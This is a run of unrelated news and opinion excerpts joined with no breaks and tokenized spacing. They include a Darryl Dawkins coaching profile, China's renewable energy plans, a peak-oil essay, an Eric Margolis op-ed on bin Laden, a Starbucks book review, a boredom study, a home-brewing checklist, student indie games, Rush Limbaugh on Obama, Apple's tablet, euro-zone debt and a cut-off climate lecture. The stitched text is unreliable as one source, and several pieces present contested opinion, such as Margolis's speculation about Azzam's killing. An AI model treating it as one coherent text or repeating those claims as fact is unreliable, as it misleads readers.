It was like looking in the mirror .
Dawkins would stop practice and scold the guards for not rewarding Pujols with the ball when he ran the floor .
This was big man sticking up for big man , goofball sticking up for goofball .
Tabitha , who watches every practice , loved it .
ESPN
The view from below of Dawkins , dunking at age 53 .
The more questions Dawkins asked , the more engrossed he became in his players , and he found out most of them worked part time .
Pujols was manager of a company that sold kitchen cutlery .
Waylen was a part - time counselor at the YMCA .
Another was a construction worker , and another mowed grass .
Another waited tables at Ruby Tuesday , and another was a movie usher .
Another got to try out again in early January , as Dawkins had promised , and quit his job at Ross Dress For Less when he made the squad .
By late January , the team 's record was hovering around .500 , and Dawkins invited the guys out to a local diner , to finally give them a glimpse of 1975 .
He rapped the Robinzine dunk and told them about a phrase he used to use : " Yo mama . "
The act is still in there .
He still calls himself " Charming Chocolate " on his voice mail ; he still has his fire - engine red and fuchsia suits in his closet .
He still says his birthday is Jan. 11 , 12 and 13 -- because he 's so big he needs three days to celebrate .
" He 's still Chocolate Thunder at home and with the refs , " Janice says .
" But he 's grown up .
We all grow up .
He just took a little bit longer .
Age , children , stability , it all changes out .
It makes you a better person if you allow it , and he embraced it . "
Says Fred Carter : " No one would 've thought , including myself , that Darryl Dawkins would be a college coach .
Darryl was never serious that 's the picture I had of Darryl in my mind .
But all this time , Darryl was absorbing knowledge .
He 's telling these kids , ' Meet your expectations -- because I did n't . '
Never saw it coming . "
At various times this season , Beck , the players and the media have asked Dawkins to dunk a ball for them for old time 's sake .
And that 's why , two days after his 53rd birthday , he is standing under an L - Tri-C basket , trying to reopen his relationship with the rim .
It 's not something he is enthused about .
He has that bad back of his and needs to see a chiropractor at least once a week .
He has n't been stretching or working out .
So as he eyeballs the basket , he is n't convinced he can rise up there .
Is this payback ?
Is this the rim getting even for Robinzine ?
The only people in the gym are Beck , the women 's basketball team and a camera crew .
" Anyone know mouth - to - mouth ? " he says , laughing .
After measuring and strategizing for 10 minutes , Darryl Dawkins finally grunts , jumps -- and slams it .
The breakaway rim snaps back into place as he walks away .
He does n't name the dunk .
He does n't need to .

Yet renewable energy may be doing more for China ’s economy than for the environment .
Total power generation in China is on track to pass the United States in 2012 — and most of the added capacity will still be from coal .
China intends for wind , solar and biomass energy to represent 8 percent of its electricity generation capacity by 2020 .
That compares with less than 4 percent now in China and the United States .
Coal will still represent two - thirds of China ’s capacity in 2020 , and nuclear and hydropower most of the rest .
As China seeks to dominate energy - equipment exports , it has the advantage of being the world ’s largest market for power equipment .
The government spends heavily to upgrade the electricity grid , committing $ 45 billion in 2009 alone .
State - owned banks provide generous financing .
China ’s top leaders are intensely focused on energy policy : on Wednesday , the government announced the creation of a National Energy Commission composed of cabinet ministers as a “ superministry ” led by Prime Minister Wen Jiabao himself .

Regulators have set mandates for power generation companies to use more renewable energy .
Generous subsidies for consumers to install their own solar panels or solar water heaters have produced flurries of activity on rooftops across China .
China ’s biggest advantage may be its domestic demand for electricity , rising 15 percent a year .
To meet demand in the coming decade , according to statistics from the International Energy Agency , China will need to add nearly nine times as much electricity generation capacity as the United States will .
Everyone agrees : our economy is sick .
The inescapable symptoms include declines in consumer spending and consumer confidence , together with a contraction of international trade and available credit .
Add a collapse in real estate values and carnage in the automotive and airline industries , and the picture looks grim indeed .
But why are both the U.S. economy and the larger global economy ailing ?
Among the mainstream media , world leaders , and America ’s economists - in - chief ( Treasury Secretary Geithner and Federal Reserve Chairman Bernanke ) , there is near - unanimity of opinion : these recent troubles are primarily due to a combination of bad real estate loans and poor regulation of financial derivatives .
This is the conventional diagnosis .
If it is correct , then the treatment for our economic malady would logically include heavy doses of bailout money for beleaguered financial institutions , mortgage lenders , and car companies , better regulation of derivatives and futures markets , and stimulus programs to jumpstart consumer spending .
But what if this diagnosis is fundamentally flawed ?
The metaphor needs no belaboring ; we all know that tragedy can result from a doctor ’s misreading of symptoms , mistaking one disease for another .
A case can be made that dire events having to do with the real estate market , the derivatives markets , and the auto and airline industries are themselves mere symptoms of an even deeper , systemic dysfunction that spells the end of economic growth as we have known it .
For several years , a swelling subculture of commentators has been forecasting a financial crash , basing this prognosis on the assessment that global oil production was about to peak .
The reasoning went like this : continual increases in population and consumption cannot continue forever on a finite planet .
This is an axiomatic observation with which anyone familiar with the mathematics of compounded arithmetic growth must agree , even if they hedge their agreement with vague references to “ substitutability ” and “ demographic transitions . ”
This axiomatic limit to growth means that the rapid expansion in both population and per-capita consumption of resources that has occurred over the past century or two must cease at some particular time .
But when is this likely to occur ?
Energy is the ultimate enabler of growth ( again , this is axiomatic : physics and biology both tell us that without energy nothing happens ) .
Industrial expansion throughout the past two centuries has in every instance been based on increased energy consumption .
More specifically , industrialism has been inextricably tied to the availability and consumption of cheap energy from coal and oil ( and more recently , natural gas ) .
However , fossil fuels are by their very nature depleting , non-renewable resources .
Further , burning these fuels releases climate - changing carbon dioxide into the atmosphere , setting up conditions for droughts , famines , and the drowning of coastal cities .
None of these events is compatible with continued , easy economic growth .
Thus , either climate catastrophe or the eventual inability to continue increasing supplies of cheap fossil energy will likely lead to a cessation of economic growth , unless alternative energy sources and efficiency of energy use can be deployed rapidly and to a sufficient degree .
Of the three conventional fossil fuels , oil is arguably the most economically vital , since it supplies nearly all transport energy .
Further , it is the fuel that is likely to encounter supply problems soonest because global petroleum discoveries have been declining for decades , and most oil producing countries are already seeing production declines .
During the period from 2005 to mid-2008 , demand for oil was growing , especially in China ( which went from being self - sufficient in oil in 1995 to being the world ’s second - foremost importer after the U.S. by 2006 ) .
But the global supply of oil was essentially stagnant : from month to month , production figures for crude oil bounced around within a fairly narrow band between 72 and 75 million barrels per day .
As prices rose , production figures barely budged in response .
There was every indication that all oil producers were pumping flat - out : even the Saudis appeared to be rushing to capitalize on the price bonanza .
Today , oil prices are only half what they were in July 2008 .
Why has the economy not quickly recovered ?
Clearly , peak oil is not the only cause of the current economic crisis .
Enormous bubbles in the real estate and finance sectors constituted accidents waiting to happen , and the implosion of those bubbles has created a serious credit crisis ( as well as solvency and looming currency crises ) that will take several years to resolve , even if energy supplies are not a problem .
Noel Kerns
But now the potential for renewed high oil prices acts as a ceiling for economic recovery .
Whenever the economy does appear to show renewed signs of life ( as has happened in May - July this year , with stock values rebounding and the general pace of economic contraction slowing somewhat ) , oil prices will take off again as oil speculators anticipate a recovery of demand .
Indeed , oil prices rebounded from $ 30 in January to nearly $ 70 in early August , provoking widespread concern that high - energy prices could nip recovery in the bud .
The problem extends beyond oil and other fossil fuels , and even beyond climate change : the world ’s fresh water resources are strained to the point that billions of people may soon find themselves with only precarious access to water for drinking and irrigation .
Biodiversity is declining rapidly .
We are losing 24 billion tons of topsoil each year to erosion .
And many economically significant minerals — from antimony to zinc — are depleting quickly , requiring the mining of ever lower - grade ores in ever more remote locations .
Thus the peak oil crisis is really just the leading edge of a broader Peak Everything dilemma .
In essence , humanity faces an entirely predictable peril : our population has been growing dramatically for the past 200 years ( expanding from under one billion to nearly seven billion ) , while our per-capita consumption of resources has also grown .
For a species , this is virtually the definition of biological success .
And yet all of this has taken place in the context of a finite planet with fixed stores of non-renewable resources ( fossil fuels and minerals ) , a limited ability to regenerate renewable resources ( forests , fish , fresh water , and topsoil ) , and a limited ability to absorb industrial waste products , including carbon dioxide .
If we step back and look at the industrial period from a broad historical perspective that is informed by an appreciation of ecological limits , it is hard to avoid the conclusion that we are today living at the end of a relatively brief pulse — a 200 - year rapid expansionary phase enabled by a temporary energy subsidy ( in the form of cheap fossil fuels ) that will inevitably be followed by an even more rapid and dramatic contraction as those fuels deplete .
The winding down of this historic growth - contraction pulse does n’t necessarily mean the end of the world , but it does mean the end of a certain kind of economy .
One way or another , humanity must return to a more normal pattern of existence characterized by reliance on immediate solar income ( via crops , wind , or the direct conversion of sunlight to electricity ) rather than stored ancient sunlight .
This is not to say that the remainder of the 21st century must consist of a collapse of industrialism , a die - off of most of the human population , and a return by the survivors to a way of life identical to that of 16th century peasants or indigenous hunter - gatherers .
It is possible instead to imagine various acceptable and even inviting ways in which humanity could adapt to ecological limits while further developing cultural richness , scientific understanding , and quality of life ( more on this below ) .
But however it is negotiated , the transition will spell an end to economic growth in the conventional sense .
And that transition appears to have begun .
If the physical scientists who warn about limits to growth are right , confronting the global economic meltdown implies far more than merely getting the banks and mortgage lenders back on their feet .
Indeed , we face a fundamental change in our economy as significant as the advent of the industrial revolution .
We are at a historic inflection point — the ending of decades of expansion and the beginning of an inevitable period of contraction that will continue until humanity is once again living within the limits of Earth ’s regenerative systems .
A case can be made that after all this is done , the end result will be a more satisfying way of life for the vast majority of citizens — offering more of a sense of community , more intergenerational solidarity , more of a connection with the natural world , more satisfying work , and a healthier environment .
Indeed , it is essential at a challenging time like this to emphasize solutions and benefits rather than dwelling only on the enormity of the crisis confronting us .
But those in charge need to understand that looking on the bright side does n’t mean promising what ca n’t be delivered — such as a return to the days of growth and thoughtless consumption .
We have entered a new economic era in which the former “ rules ” no longer apply .
Low interest rates and government spending no longer translate to incentives for borrowing and job production .
Cheap energy wo n’t appear just because there is demand for it .
Substitutes for essential resources will in most cases not be found .
Over all , the economy will continue to shrink in fits and starts until it can be maintained by the energy and material resources that Earth can supply on an ongoing basis .
Is it too late to begin a managed transition to a post - fossil fuel society ?
Perhaps .
But we will not know unless we try .
And if we are to make that effort , we must begin by acknowledging one simple , stark reality : growth as we have known it can no longer be our goal .
Osama : 10 . The US : 0 .
by Eric Margolis by Eric Margolis Recently by Eric Margolis : Welcome , Americans , toMysteriousYemen
To better understand why Osama bin Laden is so far winning his struggle to oust the western powers from the Muslim world , let us go back to 1986 , when I was covering the anti-Soviet war in then almost unknown Afghanistan .
I called on the grandly titled " Afghan Information Center " in Peshawar , Pakistan .
Peshawar was a wild and dangerous place .
I called it , " Dodge City meets the Arabian Nights " in my book on Afghanistan , War at the Top of the World .
The information center turned out to be a drab little office filled with mimeographed pamphlets and piles of dusty books .
The director was a short , thin man in a torn sweater named Abdullah Azzam .
We spoke at length of the anti-Soviet jihad ( struggle ) in Afghanistan being waged by Afghan and Arab mujahidin .
Then , Azzam told me , " when we have driven the Communist imperialists from Afghanistan , we will go on and drive the American imperialists from Arabia and the rest of the Muslim world . "
I was absolutely floored .
Except for Communists , a notorious bunch of liars , I had never heard anyone call my beloved America an imperialist power .
In those days , the US appeared the acme of good — in large part because its rival , the Soviet Union , looked so wicked .
But after the USSR collapsed , absolute power absolutely corrupted Washington ’s ruling circles and drove them to seek " full spectrum domination " of the globe and its energy resources rather than a cooperative new world order .
If you like this site , please help keep it going and growing .
Sheik Abdullah Azzam was the teacher and spiritual mentor of a young Saudi named Osama bin Laden .
Azzam gave bin Laden the blueprint for his later war against the west .
Azzam was murdered in 1989 , likely by a western intelligence service .
His pupil , Osama , launched a seemingly quixotic mission to overthrow the western - backed dictatorships and monarchies that misruled the Muslim world , and drive western power from the region .
Bin Laden proclaimed his grand strategy in the 1990’s .
He would oust the modern " Crusaders ’ by luring the US and its allies into a series of small , debilitating , hugely expensive wars to bleed and slowly bankrupt the US economy , which he called America ’s Achilles ’ heel .
Bloody attacks would enrage the US and lure it into one quagmire after another .
Bin Laden was dismissed by western intelligence as a crackpot and " enragé . "
But both the dimwitted President Gorge W. Bush and the intelligent President Barack Obama fell right into Osama ’s carefully - laid trap .
Today , Osama ’s words haunt us as we witness hysteria and chaos engulf America ’s air travel system , the war party in Washington demands the US invade Yemen , and the drums beat for war against Iran .
US airport security officials will be even more panicked when they learn a jihadist recently tried to assassinate Saudi Arabia ’s interior minister , Prince Nayef , by detonating a bomb secreted in his rectum .
Will we soon bend and spread for security — just like in prisons ?
The American colossus continues to stumble ever deeper into the Muslim world ’s violent , tangled affairs at a time when Washington is bankrupt and only runs on Chinese loans .
In 2009 , the US deficit was US $ 1.4 trillion .
But Washington managed to spend $ 200 billion on the wars in Iraq and Afghanistan by loading the costs onto the national credit card .
American soldiers are fighting in Afghanistan and Iraq .
US Special Forces , air units and CIA mercenaries are involved in combat operations in Pakistan , Somalia , Yemen , West Africa , North Africa and the Philippines .
A new US base at Djibouti is launching raids into Yemen , Somalia and northern Kenya .
US forces aided the failed Ethiopian invasion of Somalia in 2006 .
New US bases are planned in oil - producing West Africa and also in Colombia .
The Red Sea littoral is America ’s next major headache .
Somalia ’s anti-western Shebab movement controls much of that nation ’s south and center .
Yemen is a hotbed of jihadist activity that increasingly threatens neighboring Saudi Arabia , a vital American ally .
Somali pirates could turn from plunder to striking at other western interests .
As soon as the US or its satraps crush one anti-western jihadist group , another springs up somewhere else .
Washington is quietly engineering the breakup of troubled Sudan , Africa ’s largest nation , in order to dominate South Sudan ’s important oil resources and undermine the regime in Khartoum which Washington has marked for termination .
Even Egypt is growing shaky .
The US - backed Mubarak military dictatorship that has ruled the Arab world ’s most populous nation with an iron hand since 1981 faces a succession struggle once the 82 - year - old pharaoh is gone .
Al - Qaida is no longer the tiny organization founded by Osama bin Laden that never numbered more than 300 hard - core members .
It has morphed into a worldwide movement of like - minded but independent , revolutionary , anti-American groups that share Osama ’s militant philosophy .
This is precisely the kind of " asymmetrical warfare " the Pentagon has so long feared .
Ominously , a 2006 World Public Opinion poll showed large majorities in four leading Muslim nations that are key US allies , Egypt , Morocco , Pakistan and Indonesia ( a third of the Muslim world ’s population ) , believe the US is determined to destroy or undermine Islam .
They support attacks on American targets .
This was an ominous warning for the United States .
Remember all the claims by the Bush administration that Osama bin Laden was on the run , or out of business ?
He is still very much in business , and so far making his western enemies look foolish and bumbling .
The Best of Eric S. Margolis
When Bryant Simon ’s book , Every­thing but the Cof­fee : Learn­ing about Amer­i­ca from Star­bucks ( Uni­ver­si­ty of Cal­i­for­nia Press , 2009 ) arrived in my mail , I thought , great , just what we need : anoth­er book by an aca­d­e­m­ic that attempts to under­stand the world through a sim­plis­tic lens , like salt , sushi or cof­fee .
That this genre sells well prob­a­bly moti­vat­ed Simon ’s pub­lish­er .
But Simon ’s book is bet­ter and more hon­est than most of the genre in rec­og­niz­ing the lim­i­ta­tions of both author and sub­ject .
He peeks into the inner life of Amer­i­can cul­ture , but thank­ful­ly refrains from offer­ing a uni­fied the­o­ry that explains all .
Part his­to­ry , part ethnog­ra­phy , part mar­ket­ing the­o­ry and part cof­fee mem­oir , Every­thing but the Cof­fee places Star­bucks at the cen­ter of the hypocrisy of the Amer­i­can mid­dle class .
Simon has to stretch a great deal here , as he explores why , for a time , the Amer­i­can mid­dle class saw Star­bucks is cen­tral to its identity .
Simon shows us how we real­ly live , and it ai n’t pret­ty .
There was a time , not so long ago , Simon reminds us , that many of us won­dered why peo­ple would pay so much mon­ey for a cup of cof­fee – even as we were edg­ing clos­er in line to place our own order .
Star­bucks , writes Simon , ​“ had lit­tle to do with cof­fee , and every­thing to do with style , sta­tus , iden­ti­ty and aspi­ra­tion .
…
Star­bucks deliv­ered more than a stiff shot of caf­feine .
It pin­point­ed , pack­aged , and made eas­i­ly avail­able , if only through smoke and mir­rors , the things that the broad Amer­i­can mid­dle class want­ed and thought it need­ed to make its pub­lic and pri­vate lives bet­ter . ”
Star­bucks fed our emo­tion­al needs for sta­tus .
It became our lit­tle ​ “ self - gift , ” an emo­tion­al pick - me - up .
It allowed us to feel successful .
It also pro­vid­ed a safe , clean ​ “ third space ” between home and work , those big chairs and couch­es becom­ing our new pub­lic sphere .
It brought us exot­ic places and sounds , exposed us to an under­ground in the safe­ty of a cushy seat : teach­ing us about places where our cof­fee came from , and new music and lit­er­ary voic­es .
It tried to be our cul­tur­al guide and helped us feel good about our envi­ron­men­tal foot­print through its green cam­paigns and aid to farm­ers , even if Star­bucks did lit­tle and we did noth­ing but buy cof­fee .
It did so con­scious­ly , pur­pose­ful­ly manip­u­lat­ing our desires , hopes and aspi­ra­tions , all the while mak­ing us feel good about order­ing up a ven­ti soy latte .
But , we also knew , on some lev­el , that it was all a delu­sion we active­ly par­tic­i­pat­ed in .
​ “ Star­bucks worked as a sim­u­lacrum , ” Simon writes , ​“ it stamped out the real essence of the orig­i­nal idea of the cof­fee house and , through pro­lif­er­a­tion and end­less insis­tence , became itself the real thing for many bobo and cre­ative types . ”
Even as we believed we were being indi­vid­u­als , demon­strat­ing our sense of style , we were just fol­low­ing the javaman ’s mas­ter plan .
In see­ing Star­bucks as a third space , as a solu­tion to the envi­ron­ment and glob­al­iza­tion , we played into the illu­sion and lost ground on these fronts .
Simon joins a recent spate of books on the mid­dle class whose authors seem unable to sep­a­rate them­selves from their sub­ject and there­fore are com­pelled to include them­selves in the nar­ra­tive .
For instance , in Else­where , U.S.A. , soci­ol­o­gist Dal­ton Con­ley explores the dis­rup­tion of space in the mod­ern Amer­i­can mid­dle - class fam­i­ly , com­bin­ing his research with auto­bi­o­graph­i­cal slices of his own fam­i­ly life .
From Every­thing
But the Cof­fee , we learn Simon ’s cof­fee habits , haunts and unease with such .
Like much of this lit­er­a­ture , there is a con­fes­sion­al qual­i­ty .
We know we should not feel good about our par­tic­i­pa­tion in this sys­tem , but it is just so much fun .
It is as if we who study the top­ic are involved in a process of self - crit­i­cism .
This trend makes these books read­able , per­haps , but it often dilutes their ana­lyt­i­cal force .
Yet we still know too lit­tle about the mid­dle class ; with a defined work­ing - class stud­ies and his­to­ry lit­er­a­ture , we know far more about those low­er on America ’s eco­nom­ic lad­der .
Is the mid­dle class too big and mys­ti­cal to ful­ly know ?
Or is it that most of the authors who write about the mid­dle class are mid­dle - class them­selves , and thus uncom­fort­able with the self - reflec­tion so nec­es­sary for thor­ough criticism ?
What Simon and oth­ers demon­strate is that we are a cul­ture of hyp­ocrites .
We want our cof­fee and we want to feel good about it : we live in the moment .
We know deep inside that buy­ing Starbuck ’s Pike Place does not make us a bet­ter per­son , but part of us feels bet­ter hear­ing that it is sus­tain­able .
To more com­plete­ly under­stand the mid­dle class would require that we pierce the veil of this hypocrisy .

( PhysOrg.com ) -- Scientists from the University College London in the U.K. have found that living a life of boredom can kill you .
The scientists , Annie Britton and Martin J. Shipley of the Department of Epidemiology and Public Health , studied the data recorded in a survey of over 7,500 civil servants between the ages of 35 and 55 , carried out between 1985 and 1988 about their level of boredom .
They then investigated to find out whether the respondents were still alive ( in April 2009 ) .
The original survey found that 10 per cent of the respondents reported having been bored within the previous month , with women reporting being bored more than twice as often as men .
Younger workers and people with menial jobs were also high in the boredom scales .
They found that those who had said they had high levels of boredom were 37 % more likely to be dead by the end of the period than those who did not report being bored .
The researchers said this may be due to people who regularly feel bored being more prone to being unhappy and feeling unmotivated and unfulfilled , and this can lead to them adopting unhealthy habits such as smoking , drugs , or drinking .
These unhealthy habits would increase their risks of dying from conditions such as stroke or heart disease .
Shipley said the heart disease results provide enough evidence to say there is a link between the disease and boredom .
Martin Shipley , co-author of the paper , which is published in the International Journal of Epidemiology , said the study suggests people with menial jobs or who are bored at work should try to find interests outside work and avoid turning to drinking and smoking and other unhealthy habits to relieve the boredom .

So , you want to brew your own beer ?
If you have a kitchen , you can become a home brewer with a minimal amount of supplies .
If you have a garage , you might need a few more .
If you have only a back yard to work with , you should really see our article on Building an Efficient Outdoor Home Brewery after reading this .
Here we will highlight a few very important tools of the trade and a few items which are handy , but not necessary for a bare bones home brewing operation .
Here is the checklist for becoming a home brewer .
For a home kitchen - brewing set - up you are going to need the following :
Home Brewing Checklist
Brew Pot with Lid - preferably five or six gallons , and preferably stainless steel , although an enamel pot will work just fine until it dents .
Enamel pots with dents will impart some iron oxide ( rust ) into your beer .
Long Spoon - preferably stainless steel and at least 24 inches long .
The longer , the better .
Grain and hop bags -
These bags come in either muslin ( one use ) or vinyl ( re-usable ) .
We recommend vinyl , as this will save you money in the long run - at least two bags .
These will need to be cleaned thoroughly and sanitized before re-use .
Glass Carboys -
It is always useful to have a five gallon glass carboy on hand , as well as a couple of one gallon carboys or a three gallon carboy for overflow .
Never fill your carboys to the top - once the yeast really goes after the malt , the foam will overflow your airlock , causing no end of grief and possible contamination .
Re-purposing a one - gallon apple juice bottle works great for an overflow carboy , or for experiments like adding chipotle or hazelnut to a small batch .
Or , just add yeast and pop a stopper with an airlock on there for hard cider !
Air Locks - you need an airlock and a rubber stopper for each carboy .
You can always pray to the spirits or to god to protect your beer , like they did in the olden days , but airlocks work slightly better and keep flies out of your brew .
Different carboys have different sizes of opening , so make sure you have one that fits your carboy .
Surgical Tubing - four to six feet of surgical tubing of 3/8 inner diameter is necessary for racking your beer and siphoning it from the brew kettle into the carboy , or into bottles , if you are into bottles .
Funnels , Large and Small - Food grade funnels are always useful for brewing purposes , large ones for pouring wort into carboy , and small ones for bottling .
Bottle Brush , Large and Small -
You will need a large bottle brush to properly clean your large carboys , and a small bottle brush for cleaning and re-purposing beer bottles , if you wish to bottle your home brew .
Sanitizing Solution - Iodine , bleach , and oxygenating beer line cleaner are all tools for the brewers sanitizing toolbox .
Bottles , Caps , and Bottle Capper AND / OR Keg -
You will need to add the bubbles to your beer somehow , and for most home brewers this means either bottling or kegging .
Kegging your beer is by far more efficient , and can be done for a minimal expense , if you keep an eye out for soda kegs ( aka Cornelius kegs or Corny kegs in the home brew world ) .
This checklist highlights the basic tools of the home - kitchen - based home - brewer .
For those who wish to be more exacting in their brewing , we recommend the following items .
Apprentice Brewer 's Checklist :
Thermometer -
You need a long one , and the ones with a floater device are helpful .
Alternatively , you can use a meat thermometer with a float device as well ( a plastic donut , maybe ? )
Hydrometer -
This tool allows you to measure the specific gravity of your beer , and from these measurements , you will be able to calculate roughly how much alcohol is contained within your home brew .
Wort Chiller -
No more waiting hours for your beer to cool - in just 15 minutes the wort chiller will bring your beer down to room temperature .
Bottle Washer -
This item is a must if you are bottling your home brew .
Helps cleaning bottles go really fast .
Keep in mind that home brewing is an evolving process .
This list will get you started on malt extract based brewing recipes , which is just the beginning of the art of brewing .
Once you have mastered making extract based beer , try a batch half and half with malt extract and mashing the grains yourself .
After you have learned the mashing of the grains , the sky is the limit !
Check out our line of home brewing kits to get all the supplies you need in one easy package .
One of the more interesting aspects of the annual Game Developers Conference is the Independent Games Festival , a showcase for some of the best and brightest people and ideas in the industry .
Hidden among the next big indie games is the Student Showcase .
Here , 10 student - developed games compete for the top prize and $ 2,500 , and past Showcase winners have gone on to create games like Portal , Flower , and de Blob .
This year featured a record 190 entries , and the chosen 10 showcase a bright future for the video game industry .
Let 's take a look at what students are bringing to the world of gaming ; the breadth of ideas is impressive .
The sheer range of game experiences on display is remarkable .
The only non-publicly available game , Boryokudan Rue , appears to be a traditional point - and - click adventure game , albeit with some gorgeous , Blade Runner - inspired visuals and an intriguing plot .
Dreamside Maroon , meanwhile , focuses on exploration , as you traverse a surreal world while growing a vine to the moon .
The puzzle continues
Of course , there 's the requisite devilishly challenging and addicting puzzle game in the form of Continuity .
The game allows you to shuffle through the environment like a deck of cards , creating your own route through the puzzle .
It sounds confusing , but once you get a hang of the mechanic it becomes second nature .
And with a great soundtrack and simple but solid visuals reminiscent of N — another former IGF winner — it 's hard to believe that Continuity is n't a professionally developed game .
But a student game it is , developed by a team of four at Chalmers University of Technology in Sweden over a 16 week period .
" The idea came up during one of our idea - generating meetings , " Stefan Mikaelsson , one fourth of that team , told Ars .
" Nobody really took notice of the idea at first , but then Guy [ Lima Jr. , another member of the team ] made a paper prototype of the idea a week later that proved that this really was an interesting idea with a lot of depth .
It did n't take much time , but being able to play a rough version of the game that used a coin as the character helped convey the idea much better than just words . "
And Mikaelsson says that working with a small team helped them focus on what really counts : gameplay .
" Probably the most important thing we learned is the potential usefulness of limitations , " he told Ars .
" Having a limited schedule and no artist really forced us to concentrate on the game 's core .
I 'm not sure if the game would have been as focused if we had more resources to create really lively visuals or add lots of extra gameplay features . "
The team is currently hard at work porting the game to the iPhone , a potentially dangerous combination for anyone who values their productivity .
Unsurprisingly , there are also a lot of truly novel ideas on display , such as Ulitsa Dimitrova : a fully hand - drawn game where you play as a chain - smoking young boy with a prostitute for a mom .
The game repeats a seemingly endless cycle of violence and self - destruction until you stop moving the character , at which point he falls asleep and freezes to death .
There 's also Paper Cakes , a puzzle / platform game that takes place on a virtual piece of paper , which allows you to interact with the world simply by folding the page .
Then there 's Puddle , a gorgeous , physics - based game that has you rotating the environment as you attempt to move the titular puddle from the beginning of a level to the end .
The devil is in the details
Possibly the most quirky idea presented was Devil 's Tuning Fork .
A first - person exploration game inspired by the concept of echolocation , Devil 's Tuning Fork forces players to navigate its world using visual sound waves .
And when coupled with the dark visuals and haunting soundtrack , it creates a unique and somewhat unsettling atmosphere .
The game took about six months to develop , from start to finish , by a team of 15 , an unusually large size for a project like this .
You can download and play the game now via the official website .
" With a team of this size , we had to overcome a couple of challenges in order to work as a cohesive unit , " Jay Pecho , project and tech lead on the game , told Ars .
" First , we needed to create a decision - making structure .
One of the problems we faced early on was having ' too many cooks in the kitchen . '
We wanted to get everyone 's feedback and make everyone happy , but we quickly realized that more often than not , this was impossible .
So we set up a forum so everyone could put in their two cents — but the final decision rested with the project lead .
" Each person had a particular skill set in a different disciplinary field and we were able to build on each other 's strengths , " he added .
" Everybody brought something of their own to the table creatively as well , so this game is really an amalgam of the ideas of 15 individuals .
We are very happy with the way it turned out . "
As you would expect , the team was incredibly excited to learn they were chosen for the Student Showcase .
" Choose any word that is synonymous with ' thrilled ' and that was our reaction , " producer Matt Lazar told Ars .
" Most of the team was on Skype when the announcement went up and proceeded to go nuts in our team chat .
I was actually sleeping .
When I woke up I had plenty of missed calls and messages from the team .
So I knew something good must have happened . "
And the rest of the list is just as interesting : Spectre features a unique approach to storytelling , allowing players to relive the memories of a 73 - year - old man ; Igneous is a fast - paced action game where you race your way out of an erupting volcano ; and PuzzleBloom is a challenging puzzle game with a striking aesthetic , reminiscent of the most recent Prince of Persia game .
Overall it's an incredible line - up of games that makes us giddy with excitement to see what these young developers will come up with next .
But for now the focus is on IGF , which will be taking place March 9 - 13 in San Francisco .
" Continuity is among some great games , " Mikaelsson told Ars .
We could n't agree more .
Limbaugh said the country has lucked out each time one of Obama ’s initiatives has failed .
Rush : ' Thank God ' for Obama woes
Conservative radio talk show host Rush Limbaugh says he thanks God “ every day ” that he sees problems for President Barack Obama .
In an interviewing airing Wednesday on Fox News ’ “ Fox & Friends , ” Limbaugh said the country has lucked out each time one of Obama ’s initiatives has failed .

“ The fact that his agenda has totally failed this year is the best thing that could have happened to this country , ” Limbaugh said .
“ I thank God every day that it is going down the tubes . ”
Limbaugh added that he was thankful that “ this Massachusetts election happened , ” referencing Republican Scott Brown ’s win in the Senate special election there last month .
Limbaugh said that he watched Obama deliver his State of the Union address before a joint session of Congress last week , but “ gave up after 50 minutes . ”
“ I heard it all before .
There was nothing new in it .
The only difference was the tone , ” Limbaugh said , belittling Obama “ a young inexperienced guy , who is just mad . ”
“ This is the first time in his life there is not a professor who can turn his C into an A , or to write the law review article for him he can't write .
He is totally exposed .
There is nobody to make it better , ” Limbaugh said .

APPLE will unveil a new gadget to the press on Wednesday January 27th .
Although the company has remained tight - lipped about what its “ latest creation ” might be , the smart money is on its much - anticipated tablet computer .
Mystery surrounds exactly what this new device will do , though it seems certain that it will combine an e-reader , to take on Kindle and the like , internet connectivity and a touchscreen like the iPhone .
But what will Apple call the device that could change the way that newspapers , books , television and computer games are enjoyed ?

PIIGS to the Slaughter Can the Euro Zone Cope with a National Bankruptcy ?
As speculators attack the euro , Europe is facing a growing threat of national bankruptcies .
The consequences would be dramatic for the whole of the continent , especially German banks , which are highly exposed to risky debt .
EU politicians are willing to pay almost any price to help the beleaguered countries .

Yesterday afternoon , I managed to catch the Bjernes Lecture , which was given by Richard B. Alley : “ The biggest Control Knob : Carbon Dioxide in Earth ’s Climate History ” .
The room was absolutely packed – standing room only , I estimated at least 2,000 people in the audience .
And it was easy to see why – Richard is a brilliant speaker , and he was addressing a crucial topic – an account of all the evidence we have of the role of CO2 throughout prehistory .
By way of introduction , he pointed out how many brains are in the room , and how much good we ’re all doing .
Although he characterizes himself as not being an atmospheric scientist , except perhaps by default , but as he looks more and more at paleo - geology , it becomes clear how important CO2 is .
He has found that CO2 makes a great organising principle for his class on the geology of climate change at Penn State , because CO2 keeps cropping up everywhere anyway .
So , he ’s going to take us through the history to demonstrate this .
His central argument is that we have plenty of evidence now ( some of it very new ) that CO2 dominates all other factors , hence “ the biggest control knob ” ( later in the talk he extended the metaphor by referring to other forcings as fine tuning knobs ) .
He also pointed out that , from looking at the blogosphere , it ’s clear we live in interesting times , with plenty of people WILLING TO SHOUT and distort the science .
For example , he ’s sure some people will distort his talk title because , sure , there are other things that matter in climate change than CO2 .
As an amusing aside , he showed us a chunk of text from an email sent to the administrators at his university , on which he was copied , the gist of which is that his own research proves CO2 is not the cause of climate change , and hence he is misrepresenting the science and should be dealt with severely for crimes against the citizens of the world .
And then he points out a fundamental error of logic in the first sentence of the email , to illustrate the level of ignorance about CO2 that we ’re faced with .
So the history : 4.6 billions years ago , the suns output was lower ( approx 70 % of today ’s levels ) , often referred to as the faint young sun .
But we know there was liquid water on earth back then , so there must have been a stronger greenhouse effect .
Nothing else explains it – orbital differences for example were n’t big enough .
The best explanation for the process so far is the Rock - Weathering Thermostat .
When it ’s too cold , CO2 builds up to warm up .
Turn up the temperature , and the sequestration of CO2 in the rocks goes faster .
This is probably what has kept the planet in the right range for liquid water and life for 4 billion years .
But can we demonstrate it ?
The rock thermostat takes millions of years to work , because the principle mechanism is geological .
One consequence is that the only way to get to a “ snowball earth ” is that some other cause of change has to happen fast – faster than the rock - themostat effect .
One obvious piece of evidence is in the rock layers .
Glacial layers are always covered from above by carbonate rocks , hence carbonation follows icing .
This shows part of the mechanism .
But to explore this properly , we need good CO2 paleo - barometers .
The gold standard is ice core record .
So far the oldest ice core record is 800,000 years , although we only have one record this old .
Several records go back 450 K years , and many more shorter records .
The younger samples all overlap , giving some confidence that they are correct .
We also now know a lot about how to sort out ‘ good ’ ice core record from poor ( contaminated ) ones .
